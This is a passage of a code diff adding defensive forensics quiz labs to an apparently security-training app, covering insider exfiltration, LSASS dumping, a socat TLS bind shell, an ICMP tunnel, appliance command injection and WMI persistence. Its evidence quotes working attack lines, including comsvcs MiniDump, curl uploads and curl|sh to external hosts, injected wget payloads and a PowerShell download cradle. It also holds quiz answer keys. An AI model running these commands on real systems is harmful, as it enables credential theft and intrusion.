@@ -1967,4 +1967,626 @@ Bastion design today: password SSH allowed, shared service account with sudo, ou
       },
     ],
   },
+  {
+    id: 'lab-19',
+    title: 'Insider Exfiltration Seen Through Zeek',
+    domain: 1,
+    difficulty: 'Medium',
+    xpReward: 250,
+    briefing: 'HR informed security that sales engineer d.kowalski resigned yesterday and is joining a competitor. Legal asks whether any customer data left the network in the last two weeks. You have Zeek logs from the egress sensor and proxy logs, but no endpoint DLP. Build a defensible answer using network forensics.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Scope the user\'s network identity',
+        evidence: r`DHCP log (Zeek dhcp.log)
+03-01..03-14  mac 3c:22:fb:91:aa:10  hostname SALES-LT-17  assigned 10.20.3.71
+Asset DB: SALES-LT-17 -> owner d.kowalski
+VPN log: d.kowalski sessions from home 03-08, 03-11, 03-12 -> VPN pool 10.99.0.0/24 (assigned 10.99.0.44, .51, .60)`,
+        question: 'Which IP addresses must be included in the analysis?',
+        options: [
+          'Only 10.20.3.71',
+          'The whole 10.99.0.0/24 range for all dates',
+          '10.20.3.71 for office days plus the specific VPN addresses (10.99.0.44, .51, .60) during their session windows',
+          'Only the VPN addresses',
+        ],
+        correctIndex: 2,
+        hint: 'A user can appear under different IPs depending on where they connect from.',
+        walkthrough: 'Attribution needs the right IP for the right time. In the office the laptop held 10.20.3.71; from home, VPN assigned different pool addresses per session. Using the whole VPN range would wrongly include other employees. Document this mapping, because legal will rely on it.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Find unusual outbound volume',
+        evidence: r`$ cat conn.log | zeek-cut ts id.orig_h id.resp_h id.resp_p orig_bytes | \
+   awk '$2 ~ /^10\.20\.3\.71$|^10\.99\.0\.(44|51|60)$/ {sum[$3]+=$5} END {for (h in sum) print sum[h], h}' | sort -rn | head -4
+4831220119 142.250.72.10
+  92110333 13.107.42.12
+   4100221 20.190.159.2
+    810332 104.18.22.19`,
+        question: 'What stands out?',
+        options: [
+          'Traffic to Microsoft is suspicious',
+          'About 4.8 GB uploaded to a single Google IP, far more than to any other destination',
+          'Nothing; all values are small',
+          'The laptop received a large download',
+        ],
+        correctIndex: 1,
+        hint: 'orig_bytes counts data sent by the originator, which is the laptop.',
+        walkthrough: 'Summing orig_bytes per destination shows uploads. 4.8 GB to one Google address dwarfs normal use (Microsoft 365 at 92 MB is routine). Google hosts many services, so the next step is to identify which service this was.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Identify the destination service',
+        evidence: r`ssl.log (Zeek) for 10.99.0.51 -> 142.250.72.10
+ts                 server_name                  ja3s / established
+03-12 21:04:11     drive.google.com              established
+03-12 21:04:12     www.googleapis.com            established
+proxy log 03-12 21:04-22:47  user=d.kowalski  host=www.googleapis.com  path=/upload/drive/v3/files?uploadType=resumable  bytes_out total 4.79 GB
+Corp policy: personal cloud storage prohibited; corporate Google Workspace not used`,
+        question: 'What does the TLS metadata establish?',
+        options: [
+          'The content of the uploaded files',
+          'Nothing, because the traffic was encrypted',
+          'That the traffic was malware',
+          'That the upload went to Google Drive (from SNI and proxy upload paths), a personal cloud service the company does not use, during a VPN session at night',
+        ],
+        correctIndex: 3,
+        hint: 'SNI is visible even with TLS, and the proxy recorded the API path.',
+        walkthrough: 'Encryption hides content but not the server name (SNI) or, through an inspecting proxy, the API path. Drive resumable upload calls totaling 4.79 GB to a service the company does not use is strong evidence of personal cloud exfiltration. It does not by itself prove which files were uploaded.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Correlate with file access',
+        evidence: r`File server audit (5145) for d.kowalski, 03-12
+20:31-20:58  \\FS01\Sales\Customers\*  ReadData  1,912 files  (total 4.6 GB)
+20:59        \\FS01\Sales\Pricing\2026_master.xlsx  ReadData
+Normal daily baseline for d.kowalski: 15-40 file reads
+Zip artefact: Zeek files.log shows no zip over network; upload began 21:04`,
+        question: 'What conclusion is defensible for legal?',
+        options: [
+          'Shortly before a 4.79 GB upload to personal Google Drive, the user read about 4.6 GB of customer files far beyond their baseline; the timing and sizes strongly suggest those files were uploaded, though content was not directly observed',
+          'The customer files were definitely uploaded',
+          'There is no link between the events',
+          'The user was doing normal work',
+        ],
+        correctIndex: 0,
+        hint: 'State what the evidence shows and what it does not.',
+        walkthrough: 'Good forensic reporting separates facts from inferences. Facts: unusual bulk reads, then a similarly sized upload minutes later to an unapproved service. Inference: those files were the upload. Endpoint forensics on the laptop (browser history, staging folders) could confirm content. Precise, honest wording keeps the report credible.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Preserve and act',
+        evidence: r`Laptop SALES-LT-17: still with the employee (last day is Friday)
+Log retention: Zeek 30 days, proxy 14 days (03-12 logs expire 03-26)
+Legal: considering a preservation letter to the new employer`,
+        question: 'What is the best next step?',
+        options: [
+          'Export and hash the relevant Zeek, proxy, DHCP, VPN and file audit logs now, keep chain of custody, coordinate with HR and legal to recover the laptop for imaging, and disable cloud upload paths',
+          'Call the employee and ask them to delete the files',
+          'Wait for the logs to rotate',
+          'Post a warning on the company chat',
+        ],
+        correctIndex: 0,
+        hint: 'Some evidence expires in under two weeks.',
+        walkthrough: 'Preserve the expiring logs with hashes and documentation, and work through HR and legal to collect the laptop in a controlled way. Contacting the employee directly could lead to evidence destruction and legal problems. Afterwards, consider blocking unapproved cloud storage uploads and adding DLP.',
+      },
+    ],
+  },
+  {
+    id: 'lab-20',
+    title: 'Credential Theft Found in Memory',
+    domain: 1,
+    difficulty: 'Hard',
+    xpReward: 250,
+    briefing: 'EDR on the IT admin jump workstation ADM-WS02 alerted "Suspicious access to LSASS" and then went silent; the agent stopped reporting 10 minutes later. A memory image was captured remotely before the host was isolated. Use Volatility 3 to establish what happened and which credentials to rotate.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Explain why EDR went silent',
+        evidence: r`$ vol -f ADM-WS02.raw windows.pslist | grep -i -E "sense|edr|defender"
+(no output)
+$ vol -f ADM-WS02.raw windows.psscan | grep -i -E "edragent|MsSense"
+2210  EdrAgent.exe   ExitTime 2026-03-14 04:21:07
+$ vol -f ADM-WS02.raw windows.cmdline | grep -i -E "sc |taskkill"
+6612  cmd.exe  sc stop EdrAgentSvc && sc config EdrAgentSvc start= disabled`,
+        question: 'What happened to the EDR agent?',
+        options: [
+          'It crashed due to a bug',
+          'It was updated by IT',
+          'An attacker with admin rights stopped and disabled the EDR service; psscan still found the exited process, which pslist no longer shows',
+          'It is hidden by a rootkit and still running',
+        ],
+        correctIndex: 2,
+        hint: 'psscan shows exited processes. Check the command line for sc.',
+        walkthrough: 'The service was stopped and set to disabled through sc, which requires administrative rights, so the attacker already had them. psscan finds the EPROCESS block with an ExitTime, confirming termination rather than hiding. Tamper protection on the agent would have blocked this.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Find what touched LSASS',
+        evidence: r`$ vol -f ADM-WS02.raw windows.handles --pid 7740 | grep -i lsass
+7740  Process  0x2a4  lsass.exe  GrantedAccess 0x1fffff
+$ vol -f ADM-WS02.raw windows.pslist --pid 7740
+7740  6612  rundll32.exe  2026-03-14 04:19:52
+$ vol -f ADM-WS02.raw windows.cmdline --pid 7740
+7740  rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 680 C:\ProgramData\d.tmp full`,
+        question: 'What is the rundll32 process doing?',
+        options: [
+          'Loading a COM+ component for normal admin tasks',
+          'Using the built-in comsvcs.dll MiniDump export to write a full memory dump of LSASS (PID 680) to disk, a living-off-the-land credential dumping technique',
+          'Repairing LSASS',
+          'Checking certificate status',
+        ],
+        correctIndex: 1,
+        hint: 'Look at the export name and its arguments.',
+        walkthrough: 'comsvcs.dll MiniDump is a signed Windows component that attackers use to dump LSASS without bringing their own tools. The handle with full access (0x1fffff) to lsass.exe confirms it. The dump file holds credential material for every account logged on to this admin workstation.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Determine what happened to the dump',
+        evidence: r`$ vol -f ADM-WS02.raw windows.filescan | grep -i "ProgramData\\d"
+0xc60e4a21b0f0  \ProgramData\d.tmp
+0xc60e4a21c7a0  \ProgramData\d.zip
+$ vol -f ADM-WS02.raw windows.netscan | grep 6612
+TCPv4  10.20.1.22:50812  45.61.137.9:443  CLOSED  6612  cmd.exe
+$ vol -f ADM-WS02.raw windows.cmdline | grep -i curl
+6650  curl.exe -s -X POST -F "f=@C:\ProgramData\d.zip" https://45.61.137.9/u`,
+        question: 'What is the most important finding here?',
+        options: [
+          'The dump is still on disk and can simply be deleted',
+          'The dump was compressed and uploaded to an external server, so the credentials must be treated as stolen',
+          'curl was used to check for updates',
+          'The network connection failed, so nothing left',
+        ],
+        correctIndex: 1,
+        hint: 'Follow d.tmp to d.zip to curl.',
+        walkthrough: 'The dump was zipped and posted with curl to an external IP. A CLOSED socket just means the connection ended, not that it failed. Deleting local files would not undo this. Assume every credential in LSASS at 04:19 is now in the attacker\'s hands.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Identify exposed accounts',
+        evidence: r`$ vol -f ADM-WS02.raw windows.sessions
+Session  User                 Logon type
+1        CORP\it.adm.lee      RemoteInteractive (RDP)
+2        CORP\da.martin       RemoteInteractive (RDP)   <- domain admin
+0        CORP\svc_patch       Service
+$ vol -f ADM-WS02.raw windows.registry.printkey --key "SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
+UseLogonCredential  REG_DWORD  1   (last write 04:17:30)`,
+        question: 'Which statement about exposure is most accurate?',
+        options: [
+          'Only it.adm.lee is affected',
+          'All three logged-on accounts are exposed, including the domain admin, and because WDigest UseLogonCredential was enabled two minutes before the dump, cleartext passwords may have been captured too',
+          'No credentials are exposed because Windows encrypts LSASS',
+          'Only service accounts are exposed',
+        ],
+        correctIndex: 1,
+        hint: 'Who was logged on, and what registry change happened just before the dump?',
+        walkthrough: 'LSASS holds credentials for logged-on sessions, including the domain admin RDP session. Enabling WDigest caches cleartext passwords for subsequent logons, a common attacker step. With a domain admin exposed, the incident is effectively domain-wide until proven otherwise.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Respond at the right scale',
+        evidence: r`Facts: domain admin credentials stolen; attacker C2 45.61.137.9; ADM-WS02 isolated
+DC logs since 04:20: da.martin logons from 10.20.4.22 (not an admin host) at 04:41
+Krbtgt last reset: 2023`,
+        question: 'What is the right response?',
+        options: [
+          'Reset it.adm.lee only',
+          'Block 45.61.137.9 and wait',
+          'Re-enable EDR on ADM-WS02 and close the case',
+          'Treat it as a domain compromise: reset the exposed accounts (including da.martin and svc_patch), investigate 10.20.4.22, review DCs for DCSync or persistence, plan a double krbtgt reset, restore WDigest to 0, and enable EDR tamper protection and Credential Guard',
+        ],
+        correctIndex: 3,
+        hint: 'The stolen domain admin account is already being used from another host.',
+        walkthrough: 'The domain admin is in use from a non-admin host, so the attacker is active in the domain. Reset all exposed accounts, contain the new host, hunt for DC-level persistence, and plan krbtgt rotation. Hardening (tamper protection, Credential Guard, LSA protection, WDigest off) reduces the chance of a repeat.',
+      },
+    ],
+  },
+  {
+    id: 'lab-21',
+    title: 'Encrypted Socat Backdoor and Custom Suricata Rules',
+    domain: 2,
+    difficulty: 'Medium',
+    xpReward: 250,
+    briefing: 'During a threat hunt, an analyst noticed a Linux app server, app03 (10.20.11.13), accepting TLS connections on port 8443 from an external IP even though no service is supposed to listen there. Payload signatures see nothing. Identify the backdoor and write detections that work despite the encryption.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Identify the listener',
+        evidence: r`app03$ sudo ss -tlnp | grep 8443
+LISTEN 0 5 0.0.0.0:8443 0.0.0.0:* users:(("socat",pid=2918,fd=5))
+app03$ ps -o pid,ppid,user,lstart,cmd -p 2918
+ 2918 1  www-data  Thu Mar 12 23:10:44 2026  socat OPENSSL-LISTEN:8443,cert=/tmp/.c.pem,verify=0,fork EXEC:/bin/bash,pty,stderr,setsid`,
+        question: 'What is running on port 8443?',
+        options: [
+          'A socat-based encrypted bind shell: anyone connecting with TLS gets an interactive bash as www-data',
+          'A TLS web server',
+          'A database replica',
+          'A VPN endpoint',
+        ],
+        correctIndex: 0,
+        hint: 'Read the socat arguments: what does EXEC:/bin/bash do?',
+        walkthrough: 'OPENSSL-LISTEN wraps the listener in TLS with a self-supplied certificate (verify=0 accepts any client), and EXEC:/bin/bash with pty gives a full interactive shell. Running as www-data with parent PID 1 suggests it was started through the web application and detached.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Understand why signatures missed it',
+        evidence: r`Existing Suricata rule (never fired):
+alert tcp any any -> $HOME_NET any (msg:"Linux shell banner"; content:"uid="; content:"gid="; sid:1000400;)
+$ tshark -r app03.pcap -Y "tcp.port==8443" -T fields -e tls.handshake.type | sort | uniq -c
+   14 1
+   14 2
+$ tshark -r app03.pcap -Y "tcp.port==8443 && tls.handshake.type==11" -T fields -e x509sat.printableString
+localhost`,
+        question: 'Why did the content-based rule never fire?',
+        options: [
+          'The rule syntax is invalid',
+          'The rule only matches UDP',
+          'Suricata was not running',
+          'The shell traffic is inside TLS, so strings like "uid=" are encrypted and invisible to payload matching',
+        ],
+        correctIndex: 3,
+        hint: 'The pcap shows TLS handshakes on this port.',
+        walkthrough: 'Content matching works on cleartext. Once the attacker wraps the shell in TLS, the payload is opaque. Defenders must move to metadata: certificate fields, JA3/JA3S fingerprints, ports, flow patterns, and host telemetry. The self-signed certificate with subject "localhost" is one such clue.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Write a metadata-based network rule',
+        evidence: r`Facts observed:
+- Server certificate subject CN/printableString: "localhost", self-signed
+- Server port 8443 on a host that should only serve 443 behind the load balancer
+- Client 198.51.100.23 (external), sessions last 20-60 minutes
+Draft rule:
+alert tls $EXTERNAL_NET any -> $HOME_NET any (msg:"Self-signed localhost cert served from HOME_NET"; flow:established,to_client; tls.cert_subject; content:"CN=localhost"; sid:1000410; rev:1;)`,
+        question: 'There is a flaw in the draft rule. What is it?',
+        options: [
+          'tls.cert_subject is not a valid keyword',
+          'sid must be below 1,000,000',
+          'The header direction is wrong: the certificate is sent by the server in HOME_NET to the external client, so the header should be $HOME_NET any -> $EXTERNAL_NET any with flow to_client',
+          'TLS rules cannot use content',
+        ],
+        correctIndex: 2,
+        hint: 'Who sends the certificate, and in which direction does that packet travel?',
+        walkthrough: 'The server certificate travels from the server (app03, in HOME_NET) to the client (external). The header must describe that packet: $HOME_NET any -> $EXTERNAL_NET any, with flow:established,to_client. tls.cert_subject is a valid Suricata sticky buffer, and local rules should use sids of 1,000,000 or more.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Add host-based detection',
+        evidence: r`auditd and EDR capabilities available on app03
+Normal: www-data runs php-fpm workers only
+Candidate detections:
+ a) Alert when a process running as www-data opens a listening socket
+ b) Alert on execve of socat, nc, ncat by web service accounts
+ c) Alert on bash spawned with a parent of socat or nc
+ d) Alert on every outbound DNS query`,
+        question: 'Which host detections are most effective here?',
+        options: [
+          'd only',
+          'Only a',
+          'None; network detection is enough',
+          'a, b and c, since they target the behaviour regardless of encryption',
+        ],
+        correctIndex: 3,
+        hint: 'Encryption hides content on the wire but not process behaviour on the host.',
+        walkthrough: 'Host telemetry sees the backdoor directly: an unexpected listener owned by the web user, execution of socat by that account, and a shell whose parent is a network relay tool. These rules have very low false-positive rates on a web server. Alerting on all DNS would be pure noise.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Contain and find the entry point',
+        evidence: r`/var/log/nginx/access.log  03-12 23:10:31
+198.51.100.23 "POST /api/import?url=... HTTP/1.1" 200  (app feature that fetches and processes a remote file)
+App error log 23:10:40: "subprocess: convert /tmp/import_8812 ... ; curl -s 198.51.100.23/s|sh"`,
+        question: 'What is the right next step?',
+        options: [
+          'Kill socat and leave the server running',
+          'Preserve the process and certificate, kill the backdoor, block 198.51.100.23, fix the command injection in the import feature, rebuild app03, and deploy the corrected network rule and host detections',
+          'Close port 8443 on the firewall only',
+          'Rotate the TLS certificate of the website',
+        ],
+        correctIndex: 1,
+        hint: 'The backdoor is a symptom. What gave the attacker execution?',
+        walkthrough: 'The error log shows the import feature passing attacker-controlled input into a shell command, which downloaded and ran the backdoor setup. Contain (preserve, kill, block), fix the injection, rebuild the host, and keep the new detections in place. Closing only the port leaves the command injection open.',
+      },
+    ],
+  },
+  {
+    id: 'lab-22',
+    title: 'ICMP Covert Channel From a Kiosk',
+    domain: 2,
+    difficulty: 'Easy',
+    xpReward: 250,
+    briefing: 'Public lobby kiosks run a locked-down Linux image and should only reach the visitor-registration web app. The network team noticed a kiosk, KIOSK-04 (10.60.1.14), sending a steady stream of pings to an external IP. Firewalls allow outbound ICMP "for troubleshooting". Determine whether this is a covert channel and how to close it.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Profile the ICMP traffic',
+        evidence: r`$ tcpdump -nn -r kiosk.pcap 'icmp and host 10.60.1.14' | head -4
+10:02:01.112 IP 10.60.1.14 > 198.51.100.99: ICMP echo request, id 7031, seq 1, length 1032
+10:02:01.389 IP 198.51.100.99 > 10.60.1.14: ICMP echo reply, id 7031, seq 1, length 88
+10:02:01.512 IP 10.60.1.14 > 198.51.100.99: ICMP echo request, id 7031, seq 2, length 1032
+10:02:01.790 IP 198.51.100.99 > 10.60.1.14: ICMP echo reply, id 7031, seq 2, length 88`,
+        question: 'Why is this unlike normal ping?',
+        options: [
+          'Normal pings never get replies',
+          'Normal Linux pings carry 56 bytes of data with matching reply sizes; here requests carry about 1,000 bytes while replies are much smaller, so data is flowing out inside ICMP',
+          'The sequence numbers are too low',
+          'ICMP should use TCP',
+        ],
+        correctIndex: 1,
+        hint: 'A real echo reply mirrors the request payload.',
+        walkthrough: 'Echo replies normally return exactly the request\'s payload. Large requests with small, different-sized replies mean the remote side is not a normal ping responder; it is a custom server reading data out of the requests and sending its own messages back. That is an ICMP tunnel.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Inspect payload content',
+        evidence: r`$ tshark -r kiosk.pcap -Y 'icmp.type==8 && ip.src==10.60.1.14' -T fields -e data.data | head -2 | xxd -r -p | strings
+visitor_id,name,company,host_employee,badge_photo_path
+10442,Ana Ruiz,Northwind,j.cole,/var/kiosk/photos/10442.jpg`,
+        question: 'What is leaving the building?',
+        options: [
+          'Random padding',
+          'Visitor registration records (names, companies, hosts, photo paths) taken from the kiosk application data',
+          'Software update packets',
+          'DNS queries',
+        ],
+        correctIndex: 1,
+        hint: 'Decode the hex payload into text.',
+        walkthrough: 'The ICMP payload carries CSV rows from the visitor system, which is personal data. The channel was chosen because ICMP was allowed outbound and rarely inspected. Record the volume and time range for impact assessment.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Find the tunnel process on the kiosk',
+        evidence: r`KIOSK-04$ sudo ps -eo pid,user,cmd | grep -v "\[" | tail -4
+  812 kiosk    /usr/bin/chromium --kiosk https://visitors.corp.local
+ 1450 root     /usr/local/bin/.icmp_x -s 198.51.100.99 -f /var/kiosk/export.csv
+KIOSK-04$ ls -la --time-style=full-iso /usr/local/bin/.icmp_x
+-rwxr-xr-x 1 root root 31544 2026-03-10 18:22:41 /usr/local/bin/.icmp_x
+Physical access log: lobby cleaner contractor badge at KIOSK area 03-10 18:15-18:30`,
+        question: 'What is the most likely way the tool got onto the kiosk?',
+        options: [
+          'Someone with physical access installed it as root on 03-10, matching a badge entry minutes before the file was created',
+          'A remote exploit of the Chromium browser',
+          'An automatic OS update',
+          'DNS poisoning',
+        ],
+        correctIndex: 0,
+        hint: 'Compare the file timestamp with the physical access log.',
+        walkthrough: 'A hidden root-owned binary created at 18:22 while a contractor badge was in the area at 18:15-18:30 points to physical access, for example a USB boot or an unlocked console. Kiosks in public spaces need physical hardening as well as network controls. Treat the timestamp as supporting, not conclusive, evidence.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Close the channel',
+        evidence: r`Current firewall: allow icmp any from 10.60.1.0/24 to any
+Kiosk requirements: HTTPS to visitors.corp.local only
+Troubleshooting needs: network team pings kiosks from inside, not the other way round`,
+        question: 'Which firewall change is best?',
+        options: [
+          'Deny outbound ICMP echo from the kiosk VLAN to the internet (allow only what is required, such as ICMP needed for path MTU), and allow kiosks only HTTPS to the registration app',
+          'Block only 198.51.100.99',
+          'Block all ICMP everywhere in the company',
+          'Rate-limit ICMP to 10 packets per second',
+        ],
+        correctIndex: 0,
+        hint: 'Kiosks need one destination. Default-deny egress fits.',
+        walkthrough: 'Kiosks have a tiny, known communication need, so egress should be an allowlist. Blocking one IP is easily bypassed, rate limits only slow exfiltration, and company-wide ICMP blocks break legitimate diagnostics and path MTU discovery.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Recover and harden',
+        evidence: r`Kiosk fleet: 12 identical devices
+Image: no disk encryption, BIOS not password-protected, USB boot enabled, root SSH allowed with shared password
+Visitor data: last 18 months retained on each kiosk`,
+        question: 'Which plan best addresses the incident?',
+        options: [
+          'Reimage KIOSK-04 only',
+          'Replace the kiosks with paper sign-in',
+          'Check all 12 kiosks for the same binary and traffic, reimage affected ones, enable disk encryption, BIOS passwords and disabled USB boot, remove shared root SSH, keep visitor data on the server instead of kiosks, and notify privacy about the exposed visitor records',
+          'Change the root password',
+        ],
+        correctIndex: 2,
+        hint: 'One kiosk was found; the weaknesses are fleet-wide.',
+        walkthrough: 'Hunt across the whole fleet, then fix the image so physical tampering is hard (encryption, firmware locks, no USB boot) and remote admin is not a shared root password. Minimizing data stored on edge devices limits what any future compromise can take. The exposed visitor records need privacy review.',
+      },
+    ],
+  },
+  {
+    id: 'lab-23',
+    title: 'Command Injection in a Network Appliance',
+    domain: 4,
+    difficulty: 'Medium',
+    xpReward: 250,
+    briefing: 'The vendor of the branch-office VPN appliance published an advisory for an unauthenticated command injection in its web diagnostics page. Your three branch appliances are internet-facing. Determine whether yours were exploited before patching, and what the attacker did.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Search appliance web logs for exploitation',
+        evidence: r`branch-vpn-02 /var/log/httpd/access_log
+185.191.171.5 - - [10/Mar/2026:03:12:44] "GET /cgi-bin/diag.cgi?tool=ping&target=8.8.8.8 HTTP/1.1" 200 610
+185.191.171.5 - - [10/Mar/2026:03:12:58] "GET /cgi-bin/diag.cgi?tool=ping&target=8.8.8.8%3Buname%20-a HTTP/1.1" 200 702
+185.191.171.5 - - [10/Mar/2026:03:13:20] "GET /cgi-bin/diag.cgi?tool=ping&target=8.8.8.8%3Bwget%20http%3A%2F%2F185.191.171.5%2Fa%20-O%20%2Ftmp%2Fa HTTP/1.1" 200 640`,
+        question: 'What do these requests show?',
+        options: [
+          'Normal diagnostics by an administrator',
+          'A brute-force login attack',
+          'A SQL injection attempt',
+          'Command injection: after a normal ping, the attacker appended ";uname -a" and then ";wget ... -O /tmp/a" to download a file onto the appliance',
+        ],
+        correctIndex: 3,
+        hint: 'URL-decode %3B and %20.',
+        walkthrough: '%3B is ";" which ends the ping command and starts a new one. The attacker first fingerprinted the system with uname, then downloaded a file to /tmp. No authentication appears in these requests, matching the advisory.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Check the other appliances',
+        evidence: r`$ for h in branch-vpn-01 branch-vpn-02 branch-vpn-03; do echo $h; ssh $h "grep -c 'diag.cgi.*%3B' /var/log/httpd/access_log*"; done
+branch-vpn-01  0
+branch-vpn-02  3
+branch-vpn-03  0   (note: access_log rotated 03-09; older logs not retained)`,
+        question: 'What can you conclude about branch-vpn-03?',
+        options: [
+          'It was definitely not exploited',
+          'It does not run the vulnerable page',
+          'It was definitely exploited',
+          'There is no evidence of exploitation in the retained logs, but logs before 03-09 are missing, so exploitation cannot be ruled out without other evidence such as file system checks or external log copies',
+        ],
+        correctIndex: 3,
+        hint: 'Absence of evidence in a partial log is not evidence of absence.',
+        walkthrough: 'Log gaps limit conclusions. For branch-vpn-03, check for unexpected files, processes, accounts and configuration changes, and look for external logs (syslog forwarding, firewall). Report it as "no evidence found in available logs" rather than "clean".',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Examine the compromised appliance',
+        evidence: r`branch-vpn-02# ls -la /tmp/a /etc/cron.d/
+-rwxr-xr-x 1 nobody nobody 912384 Mar 10 03:13 /tmp/a
+-rw-r--r-- 1 root   root       58 Mar 10 03:20 /etc/cron.d/sysupd
+branch-vpn-02# cat /etc/cron.d/sysupd
+*/15 * * * * root /tmp/a -c 185.191.171.5:443 >/dev/null 2>&1
+branch-vpn-02# id nobody; cat /etc/passwd | grep -c ':0:'
+uid=65534(nobody) ...   2`,
+        question: 'What does this show?',
+        options: [
+          'Only a downloaded file that never ran',
+          'A normal vendor update',
+          'The attacker escalated beyond the web user (nobody) to root, added a cron job that runs the implant every 15 minutes, and there is now a second UID 0 account',
+          'A log rotation script',
+        ],
+        correctIndex: 2,
+        hint: 'Who owns the cron file, and how many accounts have UID 0?',
+        walkthrough: 'The download ran as nobody, but a root-owned cron entry appeared seven minutes later, so the attacker gained root. A second UID 0 account is another backdoor. Appliance compromises like this often survive patching because persistence lives outside the vulnerable component.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Assess downstream risk',
+        evidence: r`branch-vpn-02 stores: local VPN user database, LDAP bind account (svc_vpn_ldap) password, site-to-site PSKs
+Firewall logs since 03-10: branch-vpn-02 -> 10.20.0.0/16 SMB and LDAP connections at 04:00-04:40 (not normal for this appliance)
+VPN logins 03-10..03-14: 3 sessions for user "branchadmin" from 185.191.171.5`,
+        question: 'What should be treated as compromised?',
+        options: [
+          'The appliance, every credential and key it stores (VPN users, svc_vpn_ldap, PSKs), and the internal systems it connected to; the attacker has also been using a VPN account',
+          'Only the appliance',
+          'Only the branchadmin account',
+          'Nothing beyond the appliance because it is in the DMZ',
+        ],
+        correctIndex: 0,
+        hint: 'What secrets live on the box, and where did it connect afterwards?',
+        walkthrough: 'Edge devices hold valuable secrets and have trusted network paths inward. The appliance reached internal SMB and LDAP after exploitation, and the attacker logged in through the VPN. Scope must include stored credentials, connected internal systems, and VPN sessions.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Recover',
+        evidence: r`Vendor guidance: patch to 7.4.2; if compromise indicators found, factory reset and restore config manually (not from backup taken after 03-10)
+Available: config backup from 03-01`,
+        question: 'Which recovery plan is best?',
+        options: [
+          'Preserve evidence, factory reset branch-vpn-02, patch, restore configuration from a pre-compromise source with all secrets replaced, rotate svc_vpn_ldap and PSKs and VPN user credentials, investigate the internal hosts it touched, and forward appliance logs off-box',
+          'Install the patch on branch-vpn-02 and keep running',
+          'Restore the latest backup from 03-12',
+          'Disable the VPN permanently',
+        ],
+        correctIndex: 0,
+        hint: 'A patch closes the door; it does not remove someone already inside.',
+        walkthrough: 'Patching alone leaves the root cron job and backdoor account in place. Reset to factory, patch, rebuild configuration from a known-good point with new secrets, and follow the internal connections. Backups taken after compromise may include persistence. Forwarding logs prevents the gap seen on branch-vpn-03.',
+      },
+    ],
+  },
+  {
+    id: 'lab-24',
+    title: 'Fleet-Wide WMI Persistence Hunt',
+    domain: 5,
+    difficulty: 'Hard',
+    xpReward: 250,
+    briefing: 'Threat intelligence reports that an intrusion set targeting your industry uses WMI event subscriptions named to look like performance monitoring. Your EDR has no alerts, but Sysmon is deployed to all 2,400 Windows endpoints. Hunt for this persistence across the fleet, confirm findings, and clean up safely.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Choose the right telemetry',
+        evidence: r`Sysmon config includes:
+  EventID 19  WmiEventFilter activity detected
+  EventID 20  WmiEventConsumer activity detected
+  EventID 21  WmiEventConsumerToFilter activity detected
+SIEM retention: 90 days`,
+        question: 'Which query is the best starting point?',
+        options: [
+          'All Sysmon EventID 1 (process creation) events',
+          'Windows Security 4624 logon events',
+          'Sysmon EventIDs 19, 20 and 21 across all hosts for the last 90 days, grouped by consumer name and command line',
+          'Firewall logs for port 135',
+        ],
+        correctIndex: 2,
+        hint: 'Sysmon has dedicated events for WMI subscription objects.',
+        walkthrough: 'Events 19-21 record creation of the filter, the consumer, and the binding that links them. Grouping by consumer name and command across the fleet quickly separates common, legitimate subscriptions (from management tools) from rare ones.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Separate legitimate from suspicious subscriptions',
+        evidence: r`index=sysmon EventCode=20 | stats dc(host) AS hosts values(Destination) AS cmd BY Name
+Name                     hosts   cmd
+SCM Event Log Consumer   2400    (built-in, NTEventLogEventConsumer)
+SCCM_Health              2388    "C:\Windows\CCM\CcmEval.exe"
+PerfCounterSync          7       "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC..."`,
+        question: 'Which subscription is suspicious, and why?',
+        options: [
+          'SCM Event Log Consumer, because it exists on every host',
+          'SCCM_Health, because it runs an executable',
+          'None of them',
+          'PerfCounterSync: present on only 7 hosts, matches the reported naming theme, and runs hidden encoded PowerShell',
+        ],
+        correctIndex: 3,
+        hint: 'Use prevalence: what is rare across the fleet?',
+        walkthrough: 'Stacking (counting how many hosts have each item) is a core hunting technique. Built-in and SCCM subscriptions appear almost everywhere. A name seen on only 7 of 2,400 hosts that runs hidden, encoded PowerShell matches the intelligence and deserves investigation.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Validate on one host',
+        evidence: r`PS> Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='PerfCounterSync'" | Select Query
+SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 400
+PS> # decoded consumer payload (first line):
+IEX (New-Object Net.WebClient).DownloadString('https://cdn-perfstats.net/p')`,
+        question: 'What does this subscription do?',
+        options: [
+          'Collects performance counters for monitoring',
+          'Restarts the system every 5 minutes',
+          'About five minutes after each boot, it runs hidden PowerShell that downloads and executes code from an external domain, giving fileless persistence',
